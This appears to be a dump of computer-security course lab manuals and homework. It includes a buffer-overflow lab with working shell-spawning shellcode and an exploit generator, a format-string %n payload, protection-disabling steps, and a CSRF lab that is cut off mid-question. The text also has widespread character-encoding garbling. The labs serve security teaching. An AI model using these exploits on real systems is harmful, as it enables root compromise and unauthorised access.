""\x50"" /*Line 6: pushl %eax*/ ""\x53"" /*Line 7: pushl %ebx*/ ""\x89\xe1"" /*Line 8: movl %esp,%ecx*/ ""\x99"" /*Line 9: cdq*/ ""\xb0\x0b"" /*Line 10: movb $0x0b,%al*/ ""\xcd\x80"" /*Line 11: int $0x80*/ ; int main(int argc, char **argv) { char buf[sizeof(code)]; strcpy(buf, code); ((void(*)( ))buf)( ); } Student Name: Course: CSCE 5550 Semester: Fall 2022 Buffer Overflow Lab Copy-paste the above code to a file â€œcall_shellcode.câ€, and then compile it using the following gcc command. Note that the â€œexecstackâ€ option must be usedâ€”it allows the code to be executed from the stack; without this option, the program will fail. gcc -z execstack -o call_shellcode call_shellcode.c Run the program: ./ call_shellcode Q1: Attach a screenshot of the result. Describe your observations. (Did you get the shell?) Note: Close the terminal window. (In Section 3, you will open a new terminal window.) A few places in the above shellcode are worth explaining. First, the third instruction pushes â€œ//shâ€, rather than â€œ/shâ€ into the stack. This is because we need a 32-bit number here, and â€œ/shâ€ has only 24 bits. Fortunately, â€œ//â€ is equivalent to â€œ/â€, so we can get away with a double slash symbol. Second, before calling the execve() system call, we need to store name[0] (the address of the string), name (the address of the array), and NULL to the %ebx, %ecx, and %edx registers, respectively. Line 5 stores name[0] to %ebx; Line 8 stores name to %ecx; Line 9 sets %edx to zero. There are other ways to set %edx to zero (e.g., xorl %edx, %edx); the one (cdq) used here is simply a shorter instruction: it copies the sign (bit 31) of the value in the EAX register (which is 0 at this point) into every bit position in the EDX register, basically setting %edx to 0. Third, the system call execve() is called when we set %al to 11, and execute â€œint $0x80â€. Section 2: The Vulnerable Program /*stack.c*/ /*This program has a buffer overflow vulnerability.*/ /*Our task is to exploit this vulnerability*/ #include <stdlib.h> #include <stdio.h> #include <string.h> int bof(char *str) { char buffer[12]; Student Name: Course: CSCE 5550 Semester: Fall 2022 Buffer Overflow Lab /*print the starting address of buffer*/ printf(""The starting address of buffer is %p\n"", buffer); /*The following statement has a buffer overflow problem*/ strcpy(buffer, str); /*Print the frame pointer address*/ printf(""Frame Pointer Address is: %p\n"", __builtin_frame_address(0)); /*Use this address to find the return address*/ return 1; } int main(int argc, char **argv) { char str[517]; FILE *badfile; badfile = fopen(""badfile"",""r""); fread(str, sizeof(char), 517, badfile); bof(str); //printf(""The address of the stack pointer is: 0x%x\n"", __asm__(""movl %esp,%eax"")); printf(""Returned Properly\n""); return 1; } The above program has a buffer overflow vulnerability. It first reads an input from a file called badfile, and then passes this input to another buffer in the function bof(). The original input can have a maximum length of 517 bytes, but the buffer in bof() is only 12 bytes long. Because strcpy() does not check boundaries, a buffer overflow will occur. Since we will make this program a Set-UID program owned by root, if a normal user can exploit this buffer overflow vulnerability, this normal user might be able to get a root shell. It should be noted that the program gets its input from a file called badfile. This file is under usersâ€™ control. Now, our objective is to create the contents for badfile, such that when the vulnerable program copies the contents into its buffer, a root shell can be spawned. In the function bof, we have added a line to print the starting address of the buffer, so that we can calculate the location (address) of the return address and then overwrite it. Note that this is for learning purpose only. In a real-life attack, an attacker cannot modify an existing binary. Instead, the attacker will have to guess the return address. Student Name: Course: CSCE 5550 Semester: Fall 2022 Buffer Overflow Lab Section 3: Preparing the Environment Run the following commands: 1. Open the terminal. 2. Change to root user from normal user: sudo su root (password: â€œseedubuntuâ€) Note: Do not relinquish the root privileges until directed by the manual. 3. To determine whether our system is running 32-bit (i.e.,""i686"") or 64-bit (""x86_64"") kernel architecture, type the following command: uname -m Note: Alternatively, the â€œarchâ€ command may be used. Q2: Attach a screenshot of the result. 4. Disable address space randomization: sysctl -w kernel.randomize_va_space=0 Q3: Attach a screenshot of the result. 5. Copy the â€œstack.câ€ file into your Linux VM. Tips: If a direct copy-pasting does not work, you may email it to yourself, and then access it via the webmail in the VM. Alternatively, you may access the Canvas site in the browser. NOTE: If you copy-paste from the manual, use the DOCX file, as copy-pasting from the PDF file may add unwanted special symbols. 6. Compile â€œstack.câ€: gcc -o stack -z execstack -fno-stack-protector stack.c 7. Make the stack executable and Set-UID: chmod 4755 stack Student Name: Course: CSCE 5550 Semester: Fall 2022 Buffer Overflow Lab (After the above command, the executable program â€œstackâ€ will be marked in red, when listed in the terminal window.) Type the â€œlsâ€ command in the terminal. Q4. Attach a screenshot of the result. 8. Exit from the root user prompt to a normal user, (i.e., relinquish the root privileges): exit NOTE: Observe the prompt change from # to $. 9. Create an empty file â€œbadfileâ€: touch badfile 10. Run the application (do it twice): ./stack ./stack This step will print the buffer starting address and frame pointer (two times). The values have to be the same both times. Q5: Attach a screenshot of the result. 11. Delete â€œbadfileâ€: rm -rf badfile Section 4: Exploiting the Vulnerability 1. Make a note of the buffer starting address and the frame pointer address. In our case, these are 0xbffff144 and 0xbffff158, respectively. (Most probably, the values that you see will be different.) What is the distance between the two? Typically, it will be some number of bytes, but it may vary. 2. Find the address (location) of the return address. It is 4 bytes away from the frame pointer. In our case, the return address is stored in the locations 15c-15f. Let us call it an offset. (The frame pointer value is stored in 168-16b). Student Name: Course: CSCE 5550 Semester: Fall 2022 Buffer Overflow Lab 3. You need to calculate an appropriate address (call it a safe_offset) to overwrite the return address. At some point after safe_offset, you will write your shellcode to the buffer. Now, the return address points to this â€œsafe offsetâ€ to execute our shellcode. In the below code, we have chosen 0xbffff174 as our safe_offset (48 locations away from the buffer starting address 0xbffff144 and 20 locations away from the return address 0xbffff16c). You may need to increase or decrease the distance between buffer and safe_offset for it to work perfectly. Here, you have to use the trial-and-error method a few times in order to find a perfectly working safe_offset. 4. In the line memcpy(buffer+60,shellcode,sizeof(shellcode)) in the below code, we used â€œbuffer+60â€, which means that our shellcode starts from the address 60 of the buffer, and this has to be after the safe_offset. 5. Now, you have to write your safe_offset address location in the little endian style and assign it to â€œchar *retâ€ variable. For example, the little endian style for the address â€œ0x12345678â€ is â€œ\x78\x56\x34\x12â€, and for â€œ0xbffff174â€, it is â€œ\x74\xf1\xff\xbfâ€. In brief, all you have to do is: Run the â€œstackâ€ program, get the buffer pointer and the frame pointer addresses, select an address after the frame pointer as safe_offset, assign it to â€œretâ€ in the little endian style and start writing the shellcode after the safe_offset (buffer+distance to safe_offset+some_value). Hint: Usually, on a 32-bit Ubuntu, the buffer in the stack starts on 0xbffff144 or 0xbffff154 or 0xbffff164, etc. Hence, change the safe_offset and buffer+distance values accordingly. For the buffer address 0xbffff154 use 0xbffff184 as safe_offset, for 0xbffff164 use 0xbffff194. The shellcode starting address can begin at â€œbuffer+60â€. Code for â€œexploit.câ€: /*exploit.c*/ /*A program that creates a file containing the shellcode*/ #include <stdlib.h> #include <stdio.h> #include <string.h> Student Name: Course: CSCE 5550 Semester: Fall 2022 Buffer Overflow Lab char shellcode[]= ""\x31\xc0"" /*xorl %eax,%eax*/ ""\x50"" /*pushl %eax*/ ""\x68""""//sh"" /*pushl $0x68732f2f*/ ""\x68""""/bin"" /*pushl $0x6e69622f*/ ""\x89\xe3"" /*movl %esp,%ebx*/ ""\x50"" /*pushl %eax*/ ""\x53"" /*pushl %ebx*/ ""\x89\xe1"" /*movl %esp,%ecx*/ ""\x99"" /*cdq*/ ""\xb0\x0b"" /*movb $0x0b,%al*/ ""\xcd\x80"" /*int $0x80*/ ; void main(int argc, char **argv) { char buffer[517]; FILE *badfile; /*Assign the return address in big endian style*/ char * ret =""\x74\xf1\xff\xbf""; //here goes your safe_offset address int i=0; /*Initialize buffer with 0x90 (NOP instruction)*/ memset(&buffer, 0x90, 517); /*Fill the buffer with shell code starting from a value after safe offset*/ memcpy(buffer+60,shellcode,sizeof(shellcode)); //copy shellcode into buffer /*Overwrite return address*/ for(i=0;i<32;i+=4) memcpy(buffer+i,ret,sizeof(ret)); /*Save the contents to the file ""badfile""*/ badfile = fopen(""./badfile"",""w""); fwrite(buffer, 517, 1, badfile); fclose(badfile); } 6. Copy the above code to a file â€œexploit.câ€. (See Item 3 of the previous task for hints and warnings regarding copying the code.) 7. Compile exploit.c gcc -o exploit exploit.c Student Name: Course: CSCE 5550 Semester: Fall 2022 Buffer Overflow Lab 8. Run exploit to create badfile: ./exploit 9. Run the following two commands: ls hexdump -C badfile // This command displays the badfile to the terminal. Q6: Attach a screenshot of the result. IMPORTANT NOTE: Compile your vulnerable program first. Note that the program â€œexploit.câ€, which generates badfile, can be compiled with the default StackGuard protection enabled. This is because we are not going to overflow the buffer in this program. We will be overflowing the buffer in â€œstack.câ€, which is compiled with the StackGuard protection disabled. 10. Run the following command: ./stack Q7. Attach a screenshot of the result. 11. Type an â€œexitâ€ command to return to your original shell (the one with the customized prompt). 12. Change your shell to zsh with this command: sudo ln -sf /bin/zsh /bin/sh (Note: The purpose of using zshell is to avoid the built-in Set-UID protection of dash and bash.) 13. Now, run the vulnerable program â€œstackâ€. If your exploit is implemented correctly, you should be able to get a root shell: ./stack Note: If your exploit works correctly, you should get the root prompt â€œ#â€. It should also be noted that although you have obtained the root prompt â€œ#â€, your Real User ID remains the same â€“ i.e., that of the normal user, while the Effective User ID is now 0 (root). You can check this by typing the following: 14. Type the â€œidâ€ command. (You need to have the root prompt â€œ#â€.) Student Name: Course: CSCE 5550 Semester: Fall 2022 Buffer Overflow Lab Q8: Attach a screenshot of the result. NOTE: Before proceeding to the next section, type the â€œexitâ€ command to return to your original shell (the one with the customized prompt). Section 5: Countermeasures against buffer overflow a. Address Space Layout Randomization 15. Enable address randomization using the below command: sudo sysctl -w kernel.randomize_va_space=2 16. Perform the attacks described earlier by running the programs: ./exploit ./stack Q9. Attach a screenshot of the result. Did your attack work? Explain your observations. b. StackGuard 17. Turn off address randomization using the following command: sudo sysctl -w kernel.randomize_va_space=0 18. Compile the stack program again (as you remember, the StackGuard is enabled by default): gcc -o stack stack.c 19. Change the permission of the â€œstackâ€ file to make it Set-UID: sudo chmod u+s stack 20. Type: ls Q10. Attach a screenshot of the result. 21. Run the â€œstackâ€ program: ./stack Student Name: Course: CSCE 5550 Semester: Fall 2022 Buffer Overflow Lab Q11. Attach a screenshot of the result. Did your attack work? Explain your observations."
INTRO TO COMPUTER SECURITY,3550,Buffer Overflow Vuln,"Student Name: Course: CSCE 3550 Semester: Program Security Lab 1 of 9 Lab 1: Program Security Lab This lab will be completed on our Linux CSE servers (i.e., cse01 â€“ cse06). Section 1: Buffer Overflow A buffer overflow is a vulnerability that exists in low-level languages like C where an attacker can crash the program, corrupt the data, steal information, or even run the attackerâ€™s own code. A buffer overflow can occur when accessing memory space outside of a data structure, such as a string or character array. Typically, variables are stored together in a stack, heap, or other structure so that accessing any out-of-bounds memory of an array, for example, can result in reading or writing of bytes for some other variable. Although there are many different ways to perform a buffer overflow attack, in this lab we would like to exploit a buffer overflow on our Linux CSE machines by smashing the stack and modifying the return address of a function so as to execute that return address and display a congratulatory message with a secret code. In this problem, you will perform several operations and analyze the results. A source code program in C called bufOvfl.c was written that contains a function called privateFunction() whose only purpose is to print out a congratulatory message and display a secret code word. The operating system on each of our CSE machines has enabled stack protection (i.e., preventing ""smashing the stack"" attacks), so the source code was compiled with the â€“fno-stack-protector option to disable the stack protection for this activity. Without this compile option, our buffer overflow attack would result in the following error, even though done correctly: *** stack smashing detected ***: <unknown> terminated Aborted (core dumped) The bufOvfl executable is being provided to you in this assignment and your goal is to exploit the binary (i.e., executable) to print out the congratulatory message and secret code word by just modifying the input. Currently, you can run the program, enter some text, and it will print out the text that you entered as follows (check it out for yourself, but make sure the downloaded file is executable, i.e., chmod u+x bufOvfl): $ ./bufOvfl Enter some text: hello You entered: hello Instead of simply echoing our input as shown above, we want it to respond with a congratulatory message and the secret code word. Student Name: Course: CSCE 3550 Semester: Program Security Lab 2 of 9 Before starting your attack, you need to first examine the memory layout of a C program, especially the stack, the stack contents, and what happens during function calls and returns. Letâ€™s review some of the essential components to make sure you understand how data is stored and used. â€¢ For a function, the stack stores all function parameters, return addresses, and local variables of the function. As a LIFO (Last In, First Out) structure, it grows downward in memory as new function calls are made. â€¢ Executable code is stored in the text section. The loader then loads instructions from the text section and executes them. â€¢ The stack pointer register, %esp, stores the address of the top of the stack, which is the address of the last element on the stack. Since the stack grows downward in memory, the %esp points to the value in the stack at the lowest memory address. â€¢ The base pointer register, %ebp, is usually set to %esp at the start of the function to keep tab of function parameters and local variables. Local variables are accessed by subtracting offsets from %ebp while function parameters are accessed by adding offsets to %ebp. â€¢ The instruction pointer register, %eip, stores the address of the next instruction to be executed. After each instruction is executed, its value is incremented depending on the size of the instruction. Student Name: Course: CSCE 3550 Semester: Program Security Lab 3 of 9 The first thing that we want to do to exploit this binary is display the disassembled executable code on one of our CSE machines as follows: $ objdump â€“d ./bufOvfl You can run man objdump for help on using this utility. Note that each studentâ€™s output may vary because the loader may load the executable in a different memory location for each student. There exists a function in the source code called privateFunction(). The hex address of privateFunction(), is displayed to the left of the text ""<privateFunction>:"". You will need to keep track of this hex address as this will be address that we will use when overwriting the return address on the stack. Q1: Provide a screenshot of the <privateFunction> block of memory only and note the starting hex address of the privateFunction() for later use. Now, we want to see how many bytes are reserved for the buffer that we can use to overflow. We look for the second lea instruction in the echo() function that indicates the address of the buffer that starts at so many bytes before the %ebp register. The value after the ""-"" and before the %ebp in parentheses is the number of bytes in hex reserved for the buffer. You will need this value in decimal to know how many bytes (i.e., characters) in the echo() function are reserved for the buffer. Q2: Provide a screenshot of the line with the second lea instruction in the echo() function. Q3: Convert this hexadecimal value for the number of bytes reserved for the buffer to its decimal representation and write down its decimal value. Student Name: Course: CSCE 3550 Semester: Program Security Lab 4 of 9 Before designing our payload to overflow the buffer, we need to get some information about our Linux CSE machine architecture. To determine whether our system is running 32-bit (i.e.,""i686"") or 64-bit (""x86_64""), we can issue the uname â€“m command or arch command to see the result. This will Identify whether or not our Linux CSE machine is running in 32-bit or 64-bit mode (i.e., whether or not a 32-bit or 64-bit address is needed in the return address). You can write down the bit mode result here: Q4: Provide a screenshot of the results for both of these commands that includes your EUID, showing which mode is used. Note that both of these commands should result in the same mode. We can confirm whether or not the byte order of our system is big endian or little endian with the following command: $ lscpu | grep Endian The difference between little endian and big endian can be summarized here: The output will indicate which byte order our system is using. Q5: Provide a screenshot of the results for this command that includes your EUID identifying the byte order that our Linux CSE server is using. Now, we now need to design our payload so that we can overflow the buffer. Given that x number of bytes (found in Q3 above) are reserved for the buffer, we also know that it is located right next to %ebp, the base pointer register of the main() function. If the system is running in 32-bit mode, then the next 4 bytes will store the %ebp and the subsequent 4 bytes after that will store the return address that %eip will jump to after it completes the function. However, if the system is running in 64-bit mode, then the %ebp and the return address will be 8 bytes each. What this means is that x plus either 4 or Student Name: Course: CSCE 3550 Semester: Program Security Lab 5 of 9 8 bytes (depending on whether the system runs in 32-bit or 64-bit mode) should be any random characters and then the next 4 or 8 bytes (again, depending on the system running in 32-bit or 64-bit mode) will be the address of the privateFunction() function. We know the address of the privateFunction() function, but we need to make sure the address of privateFunction() is put in the proper format: for a little endian machine, the bytes need to be specified in reverse order, but in a big endian machine, the bytes need to be specified as shown. Fortunately, we can accomplish this task in Python by piping this payload directly into the bufOvfl binary executable. For example, assuming the privateFunction() has an address in hex of 0x01234567 on a big endian machine running in 32-bit mode and we want to add 20 bytes of random characters, we could perform the following: $ python â€“c 'print ""a""*20 + ""\x01\x23\x45\x67""' | ./bufOvfl In this example, we are sending 20 lowercase a's followed by the hex address of privateFunction() to the bufOvfl binary executable. We print \x01 because the 01 was in hex. If we did this correctly, the binary would print out our text (followed by some garbage characters), plus a congratulatory message with the secret code word. Do not worry if a segmentation fault (core dump) occurs as long as you get the secret code word! Q6: Provide a screenshot of the results for this command that includes your EUID showing your Python command as well as the results with the congratulatory statement and secret code word. Student Name: Course: CSCE 3550 Semester: Program Security Lab 6 of 9 Section 2: Format String Vulnerabilities Another attack on format string vulnerabilities is to change the programâ€™s data in memory to some other value. But we need to understand a few things first. Using the %n format specifier in printf() can result in writing the number of characters printed out so far into memory. Consider the following sample code: #include <stdio.h> int main() { int i; printf(""hello%n\n"", &i); printf(""i = %d\n"", i); return 0; } In the above code, when printf() gets to the %n, it has already printed five characters, so it stores the integer 5 to the provided memory address for i. Compile and run the code to verify for yourself. The %n treats the value pointed to by the va_list pointer as a memory address and writes to the location. Hence, if we want to write a value to a memory location, we need to have its address on the stack. In the fmtStrVuln.c code included with this assignment, if we know the address of the var to be 0xbffff304, for example, we can use command substitution at our command prompt on our Linux CSE machines as follows to change the value contained in the var variable: $ echo $(printf ""\x04\xf3\xff\xbf"").%x.%x.%x.%x.%x.%n > input The address of var is given in the beginning of the input so that it is stored on the stack. The $(command) is command substitution that allows the output of the command to replace the command itself. Note that ""x04"" indicates that ""04"" is an actual number and not two ASCII characters. This will create a file called input in your current directory that will be used to redirect input from the keyboard to this input file in our attack. Since we know that the address of var is on the stack, our goal is to move the va_list pointer to this location and then use %n to store some value. We can use %x to advance the va_list pointer. Unknown to us, though, is how many %xâ€™s are required to do this. This can be visualized as follows: Student Name: Course: CSCE 3550 Semester: Program Security Lab 7 of 9 Using trial and error (as is often the case when creating an attack), we check how many %xâ€™s are needed to print out 0xbffff304. Compiling and executing the fmtStrVuln.c code with the assumption that var has an address of 0xbffff304, for example, we can see the following example: $ echo $(printf ""\x04\xf3\xff\xbf"").%x.%x.%x.%x.%x.%n > input $ ./a.out < input Target address: bffff304 Target address data: 0x11223344 Enter a string: ****.63.b7fc5ac0.b7eb8309.bffff33f.11223344. Target address data: 0x2c Here, we needed five %x format specifiers and one %n, but yours may differ. After the attack, data in the target address was modified to 0x2c (44 in decimal) since 44 characters were printed out before the %n. This would be a great and easy format specifier vulnerabilities attack, except for one problem. When you run the program again and again, will you get the same address? The answer is no! You can verify for yourself by running your program several times and checking the target address. Address randomization (i.e., ASLR) was introduced to make a number of attacks more difficult, such as buffer overflow, format string, etc. Unfortunately, turning off address randomization on our Linux CSE machines requires a sudo password, which means you need root access since the /proc/sys/kernel/randomize_va_space interface controls ASLR system-wide. Fortunately, we donâ€™t need a system-wide change, so we can use the ADDR_NO_RANDOMIZE flag to temporarily disable ASLR for your shell only. Control of this flag can be done with setarch and its -R option as follows: $ setarch `uname -m` -R /bin/bash Student Name: Course: CSCE 3550 Semester: Program Security Lab 8 of 9 This will open a new bash shell for you with ASLR disabled, including all child processes run from this shell. This means that when you are done with this part of the assignment, you should type exit to exit your shell to make sure there are no side effects. So letâ€™s put it all together and attack a format string vulnerability! Compile the fmtStrVuln.c source code and then run two times to verify that the target address changes across different runs. Do not worry if there is a warning when you compile as it should successfully compile. Q7: Provide a screenshot of the results for two normal runs of this program that includes your EUID to show that the target address changes between runs. Temporarily disable ASLR for your shell with the following command: $ setarch `uname -m` -R /bin/bash Compile the fmtStrVuln.c source code file again and then run two times to verify that the target address now remains the same across different runs. Q8: Provide a screenshot of the results for two normal runs of this program that includes your EUID to show that the target address stays the same between runs. Student Name: Course: CSCE 3550 Semester: Program Security Lab 9 of 9 Now, knowing that the target address will remain the same across different runs in this shell, use command substitution to create a file called input that will be used to redirect input to your executable. A couple things to note: a. You will need to determine whether our system is running 32-bit or 64-bit as well as whether the byte order is big endian or little endian. You may refer to the lab section for the buffer overflow problem for details on this. The results will determine how you will create the target address used in the command substitution. b. You will have to use trial and error to determine how many %xâ€™s are needed. Q9: Provide a screenshot of the bash statement used to create the input file that includes your EUID. Then display the contents of the input file using the more command all in the same screenshot. Finally, show your format string vulnerability attack here, but be sure that the target address data changes to some new value from the original 0x11223344. Q10:Provide a screenshot of the program execution using input redirection with the input file that includes your EUID. Be sure that the target address data value was changed! Be sure to exit your shell that temporarily disabled ASLR when done!"
INTRO TO COMPUTER SECURITY,5550,Command Prompt,"Command Prompt Customization Manual You will customize the command prompt by setting the hostname as your EUID (Enterprise UserID). Customization steps: 1. Login to with your regular credentials. 2. First, set the hostname: open the terminal window and type the below command, where â€œEUIDâ€ must be replaced with your actual EUID. (You will be prompted the root password; remember that it is the same as that of the normal user.) sudo hostnamectl set-hostname EUID 3. Close the terminal, open it again and confirm that in the command prompt, the hostname is now the same as your EUID. 4. Next, update the /etc/hosts file: type the following command: sudo nano /etc/hosts Then, replace the old hostname with your EUID. Save the file and exit. Reference: https://phoenixnap.com/kb/ubuntu-20-04-change-hostname General recommendation: You may consider creating a backup of the VM image after making these customization changes, so that you can restore the snapshot in the event something goes wrong during the lab. For that in VirtualBox, click the Machine menu, then click Take Snapshot (or Host+T). When you close the VM window (by clicking on the â€œxâ€ button), VirtualBox will ask if you want to restore to the snapshot you saved. You can also manually restore the snapshot from VirtualBox, by clicking on the three dot/line menu for the VM, then Snapshots, then right-click on the snapshot Â® Restore."
INTRO TO COMPUTER SECURITY,5550,Computer Security,"CSCE 5550 â€“ Introduction to Computer Security Fall 2022 Homework 1 Question 1 (25 points): Classify each of the following as a violation of confidentiality, or integrity, or availability, and other concerns and explain why: 1. Eve injects a ransomware to Aliceâ€™s computer. Alice pays the ransom and Eve returns an incorrect key. 2. Alice, Bob, and Eve are using the same computer with no administrative privileges. Somehow, Eveâ€™s executable can take root actions and deletes the user files and corrupts the system files. 3. Aliceâ€™s computer at home can no longer access network, even though all other computers can access. When she monitors the network traffic, she sees large amount of traffic from Eveâ€™s computer. Eve rejects that she has anything to do with it. Question 2 (20 points): Assume that you are trying to find out your forgotten password. Explain how you can find out the password using brute-force attack and dictionary attack. Explain how much time they would require breaking the password (assume that your computer can try 1,000 passwords in a second). And you assume that your password had 8 alphanumeric characters. Question 4 (15 points): Explain the followings: - What are the key differences between Unix and Linux? - What are the following directories used for in Linux? /etc/, /tmp/, /root/, / - What happens when you create the following directories in Linux, would it give an error, why? /tmp/my+dir, /tmp/MyDir, /tmp/mydir Question 5 (40 points): Find three big cybersecurity attacks that happened after 2021 (including 2021). For each attack what vulnerability has been exploited, how the attack worked (i.e., how bit it was, how many computers were used, etc.), how it was mitigated. And apply STRIDE and DREAD for each of them."
INTRO TO COMPUTER SECURITY,5550,Cross-Site Rqst Forgery,"Student Name: Course: CSCE 5550 Semester: Fall 2022 Cross-Site Request Forgery (CSRF) Attack Lab Lab 6: Cross-Site Request Forgery (CSRF) Attack Lab This lab will be based on the SEED Lab (https://seedsecuritylabs.org/Labs_16.04/Web/Web_CSRF_Elgg/), which uses the SEEDUbuntu-16.04-32bit VM (https://seedsecuritylabs.org/lab_env.html). See https://seedsecuritylabs.org/Labs_16.04/Documents/SEEDVM_VirtualBoxManual.pdf for the manual on importing the SEEDUbuntu VM into VirtualBox. Follow the 7 steps in â€œHow to Use Virtualbox to Run SEEDUbuntu VMâ€. For this lab, you do not need to configure the network (as explained in the Appendix B). In VirtualBox, for the SEED Ubuntu VM, click in the menu Machine Â® Settingsâ€¦, â€œNetworkâ€ section, in â€œAttached toâ€, set â€œNATâ€. This document contains customizations, questions, and additional instructions specific to how this SEED lab is conducted for this course. NOTE: Before running this lab, you must read the original SEED lab description: https://seedsecuritylabs.org/Labs_16.04/PDF/Web_CSRF_Elgg.pdf and also, you may consider having this description opened in another window. (Ignore Sec. 4.1 of that description as we will not use the HTTP Header Live add-on.) IMPORTANT NOTES: â€¢ URLs (www.csrflabelgg.com and www.csrflabattacker.com) in the below tasks should only be accessed from inside of the SEEDUbuntu-16.04-32bit VM. â€¢ The /etc/hosts file is modified to map the domain name of each URL to the virtual machineâ€™s local IP address (127.0.0.1). â€¢ Make sure to use the website names EXACTLY as they are shown above, otherwise you may get the wrong website. â€¢ DO NOT access these URLs from your host machine or from other VMâ€™s as the actual Internet domains are not controlled by UNT. Student Name: Course: CSCE 5550 Semester: Fall 2022 Cross-Site Request Forgery (CSRF) Attack Lab NOTE: Address all the questions (Q1, Q2, etc.) marked in bold. When a screenshot is requested, try to fit all the results in one image. If this is not possible, then attach multiple screenshots. When a question is asked, e.g. â€œWho is the owner of the file?â€, type your answer, do not simply provide a screenshot. IMPORTANT NOTE: Before starting the lab, you must customize your command prompt as described in the Command Prompt Customization Manual. This customization manual directs you to place your EUID (Enterprise User ID) into the command prompt. Submissions which do not comply with this requirement will receive no credit. IMPORTANT NOTE: This lab contains additional customizations. In several places, you must add your EUID such that it will appear on the screenshots. Submissions which do not comply with this requirement will receive no credit. Task 1: Observing HTTP Requests In Cross-Site Request Forget attacks, we need to forge HTTP requests. Therefore, we need to know what a legitimate HTTP request looks like and what parameters it uses. We will use Firefoxâ€™s Web Console for this purpose. In this task, we will capture an HTTP GET request and an HTTP POST request in Elgg. 1. Start the Firefox Browser and open the â€œNetworkâ€ tab of the Web Console: Tools Â® Web Developer Â® Network. Click â€œHTMLâ€ and â€œXHRâ€ buttons in the console. This way, only relevant requests will be displayed. 2. Access the website (http://www.csrflabelgg.com/) in Firefox. Do not login. 3. Use the Web Consoleâ€™s â€œNetworkâ€ tab to observe an HTTP GET request for the website (http://www.csrflabelgg.com/). Note that you can change the size of the Web Console by moving its upper border according to your convenience. Student Name: Course: CSCE 5550 Semester: Fall 2022 Cross-Site Request Forgery (CSRF) Attack Lab Note: You need to reload the webpage to see the request, if you opened the Web Console after accessing the webpage. To see the parameters, use the â€œParamsâ€ tab on the right. Q1: Attach a screenshot of the result. What parameters were used in this request (if any)? 4. Login to the website (http://www.csrflabelgg.com/) as Charlie (username: charlie, password: seedcharlie). Do not close the Web Console. 5. Use the Web Consoleâ€™s â€œNetworkâ€ tab to observe an HTTP POST request for (http://www.csrflabelgg.com/). Do not close the Web Console. Q2: Attach a screenshot of the result. What parameters were used in this request (if any)? Task 2: CSRF Attack with GET Request In this task, we consider two people in the Elgg social network: Alice and Boby. Boby wants to become a friend to Alice, but Alice refuses to add him to her Elgg friend list. Boby decides to use the CSRF attack to achieve his goal. He sends Alice an URL (via an email or a posting in Elgg); Alice, curious about it, clicks on the URL, which leads her to Bobyâ€™s website: (www.csrflabattacker.com). As Boby, you will construct the content of this website, so that as soon as Alice visits the web page, Boby is added to the friend list of Alice (assuming that Alice has an active session with Elgg). To add a friend to the victim, we need to identify what the legitimate HTTP request (a GET request) for adding friends looks like. We will use the Web Console (as in the previous task) to do the investigation. Note that in this task, you are not allowed to write JavaScript code to launch the CSRF attack. First, let us investigate the legitimate HTTP requests by adding friends when working as a user Charlie, and comparing the results. 6. Make sure that you are logged in as Charlie (username: charlie, password: seedcharlie). Click on â€œMoreâ€ Â® â€œMembersâ€. Click on Aliceâ€™s name. Make sure that the Web Console Network tab is open so that you can see the request you are about to make. Click on â€œAdd Friendâ€ (the button on the left). Q3: Attach a screenshot of the details of the â€œAdd Friendâ€ request to add Alice as one of Charlieâ€™s friends. What parameters are sent in this request? What URL is the request being sent to? Student Name: Course: CSCE 5550 Semester: Fall 2022 Cross-Site Request Forgery (CSRF) Attack Lab 7. Go back to the â€œMembersâ€ list. Click on â€œBobyâ€. Make sure that the Web Console Network tab is open so that you can see the request you are about to make. Click on â€œAdd Friendâ€ (the button on the left). Q4: Attach a screenshot of the details of the â€œAdd Friendâ€ request to add Boby as one of Charlieâ€™s friends. What parameters are sent in this request? Next, you need to consider how the results of the above experiments help Boby to craft a CSRF request to add Alice as a friend even though she does not want to become his friend. Consider the index page of Bobyâ€™s attacking website (www.csrflabattacker.com). Q5: What URL (i.e., CSRF request) should this page contain for Bobyâ€™s attack to succeed? NOTE: In the â€œAdd Friendâ€ HTTP requests, you may notice that each request includes two parameters, __elgg_ts and __elgg_token. They are used as a countermeasure against CSRF attacks. Specifically, if these parameters do not contain correct values, the request will not be accepted by Elgg. We have disabled the countermeasure for this lab, so there is no need to include these two parameters in the CSRF requests. In particular, there is no need to include these two parameters into your answer to the above question. 8. Create an index.html file inside the attackerâ€™s website (www.csrflabattacker.com; /var/www/CSRF/attacker folder). Design this page so that anyone with an active Elgg session that visits the page will automatically become Bobyâ€™s friend whether that person wants to or not. Notes: This page should achieve the stated goal without using any JavaScript. Moreover, the attack should work as soon as Alice visits the index page, without even making any clicks on it. Customization: The index page MUST contain your EUID somewhere in the visible text. Hint for the attack: The â€œimgâ€ tag automatically triggers an HTTP GET request whether the image exists or not. NOTE: Create a backup copy of this file because you will need to overwrite and then restore this file in later steps. Q6: Attach the source code for the attackerâ€™s index.html file. Student Name: Course: CSCE 5550 Semester: Fall 2022 Cross-Site Request Forgery (CSRF) Attack Lab Next, Boby will send a message to Alice with a link to his attacking website. We will assume that Alice is not careful (maybe, she did not take CSCE 5550 course :-), so she will click on the link. 9. Log in as Boby (http://www.csrflabelgg.com/, username: boby, password: seedboby). Go to the â€œMembersâ€ list. Click on â€œAliceâ€. Q7: Attach a screenshot proving that Alice is not friends with Boby. 10. Click on â€œSend a messageâ€. Send a message to Alice with a link to the www.csrflabattacker.com website. Customization: The message MUST contain your EUID somewhere in the visible text. Note: The message subject must be non-empty, otherwise the website will throw an error. (This is an unintentional bug in the website implementation.) 11. Log in as Alice. Click on the envelope to view your messages. Q8: Attach a screenshot of the message that you sent to Alice. Make sure that it includes your EUID and a link to the www.csrflabattacker.com website. 12. Click on the link in Bobyâ€™s message. Q9: Attach a screenshot of how the webpage looks when Alice views it. 13. Go back to www.csrflabelgg.com in your browser. Q10: Attach a screenshot of the result. Task 3: CSRF Attack Using POST Request In this part of the lab, Bob will run another CSRF attack with a goal to deface Aliceâ€™s profile so that it reads â€œBoby and ${Your_EUID} are MY HEROES!!â€ (replace ${Your_EUID} with your actual EUID). 14. Log in as Alice (http://www.csrflabelgg.com/, username: alice, password: seedalice). 15. Click on â€œEdit profileâ€. 16. Open the Web Console Network tab so that you can see the request you are about to make. Fill out the form with some information (this information can be arbitrary) and click â€œSaveâ€. Student Name: Course: CSCE 5550 Semester: Fall 2022 Cross-Site Request Forgery (CSRF) Attack Lab Q11: Attach a screenshot of the details of the request to update Aliceâ€™s profile. Remember that Boby wants to run a CSRF attack to deface Aliceâ€™s profile so that it reads â€œBoby and ${Your_EUID} are MY HEROES!!â€. (Replace ${Your_EUID} with your actual EUID.) Q12: What 